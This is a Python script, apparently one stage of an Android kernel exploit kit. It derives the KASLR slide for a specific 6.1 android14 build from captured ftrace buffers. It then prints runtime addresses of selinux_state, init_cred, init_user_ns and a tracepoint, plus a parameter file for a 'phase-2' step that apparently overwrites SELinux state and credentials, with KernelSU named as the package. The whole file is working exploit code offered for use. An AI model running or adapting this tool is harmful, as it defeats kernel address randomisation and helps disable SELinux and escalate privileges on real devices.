#!/usr/bin/env python3
"""vote.py -- KASLR slide from the phase-1 capture, and the runtime addresses
the phase-2 plan needs.

  python vote.py <phase1-dir> <syms.txt>

<phase1-dir> holds callers.txt (text trace, caller=NAME+0xoff/0xsize) and
raw0.bin..raw7.bin (per-CPU trace_pipe_raw).  <syms.txt> is a link-time
kallsyms dump ("0xADDR name" per line) for the same kernel build; the kit
ships syms150.txt for 6.1.145-android14-11-gf506252fa70d.

The slide is per boot: if the phone rebooted after the capture, the result is
useless.  Verify the printed kernel string matches the target build first.
"""
import glob
import os
import re
import struct
import sys
import collections

SLIDE_MAX = 0x8000000000      # observed up to ~0x1f16000000
SLIDE_ALIGN = 0x200000        # 2 MB
TEXT_RE = re.compile(r"caller=([A-Za-z_][A-Za-z0-9_.]*)\+0x([0-9a-fA-F]+)/")


def load_syms(path):
    syms = {}
    with open(path, "r", errors="replace") as f:
        for line in f:
            parts = line.split(None, 1)
            if len(parts) != 2:
                continue
            try:
                a = int(parts[0], 16)
            except ValueError:
                continue
            syms.setdefault(parts[1].strip(), a)
    return syms


def main(argv):
    if len(argv) != 2:
        print(__doc__)
        return 2
    d, syms_path = argv
    syms = load_syms(syms_path)

    pairs = set()
    callers = os.path.join(d, "callers.txt")
    if os.path.exists(callers):
        with open(callers, "r", errors="replace") as f:
            for line in f:
                m = TEXT_RE.search(line)
                if m:
                    pairs.add((m.group(1), int(m.group(2), 16)))

    raws = set()
    for p in glob.glob(os.path.join(d, "raw*.bin")):
        data = open(p, "rb").read()
        for i in range(0, len(data) - 8, 8):
            v = struct.unpack_from("<Q", data, i)[0]
            if (v >> 48) == 0xFFFF and (v >> 40) != 0xFF:
                raws.add(v)

    print("anchors=%d raw_values=%d" % (len(pairs), len(raws)))
    votes = collections.Counter()
    backers = collections.defaultdict(set)
    for name, off in pairs:
        a = syms.get(name)
        if a is None:
            continue
        link = a + off
        for v in raws:
            s = v - link
            if 0 <= s < SLIDE_MAX and (s & (SLIDE_ALIGN - 1)) == 0:
                votes[s] += 1
                backers[s].add(name)

    if not votes:
        print("no slide candidate; send the capture back for a manual look")
        return 1
    for s, c in votes.most_common(5):
        print("slide=%#x votes=%d anchors=%s" %
              (s, c, ",".join(sorted(backers[s]))[:120]))
    slide, hit = votes.most_common(1)[0]
    if hit < 4 or len(backers[slide]) < 2:
        print("WEAK: best slide %#x only %d votes from %d anchors -- do not use"
              % (slide, hit, len(backers[slide])))
        return 1

    out = {}
    for name, add in (("__tracepoint_sys_exit", 0x40),
                      ("selinux_state", 0),
                      ("init_user_ns", 0),
                      ("init_cred", 0)):
        link = syms.get(name)
        if link is None:
            print("missing symbol %s in %s" % (name, syms_path))
            return 1
        out[name] = link + add + slide

    print()
    print("KASLR slide      = %#x" % slide)
    print("__tracepoint_sys_exit+0x40 = %#x" % out["__tracepoint_sys_exit"])
    print("selinux_state              = %#x  (zero target state-7 = %#x)"
          % (out["selinux_state"], out["selinux_state"] - 7))
    print("init_user_ns               = %#x" % out["init_user_ns"])
    print("init_cred                  = %#x" % out["init_cred"])
    print()
    print("---- params.env (fill CTXMAP/PKG for this device) ----")
    print("FUNCS_ADDR=%#x" % out["__tracepoint_sys_exit"])
    print("SELINUX_STATE=%#x" % out["selinux_state"])
    print("INIT_USER_NS=%#x" % out["init_user_ns"])
    print("CTXMAP=u:r:shell:s0")
    print("PKG=me.weishu.kernelsu")
    print("ATTEMPTS=16")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
